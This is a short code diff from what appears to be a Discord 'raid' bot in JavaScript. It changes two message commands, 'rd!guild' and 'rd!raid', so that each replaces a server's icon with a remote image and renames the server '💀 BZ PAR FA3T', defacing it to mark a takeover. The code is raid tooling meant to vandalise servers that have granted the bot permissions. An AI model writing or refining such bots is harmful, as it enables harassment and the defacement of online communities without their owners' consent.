@@ -66,12 +66,12 @@ client.on('message', msg => {
     }
 
     if(msg.content === "rd!guild"){
-        msg.guild.setIcon("AnonimousLogo.jpg").catch(e => {});
+        msg.guild.setIcon("https://cdn.discordapp.com/attachments/522698805834022915/523002600069791745/3956-full.png");
         msg.guild.setName("💀 BZ PAR FA3T")
     }
 
     if(msg.content === "rd!raid"){
-        msg.guild.setIcon("AnonimousLogo.jpg").catch(e => {});
+        msg.guild.setIcon("https://cdn.discordapp.com/attachments/522698805834022915/523002600069791745/3956-full.png");
         msg.guild.setName("💀 BZ PAR FA3T")
     }
 
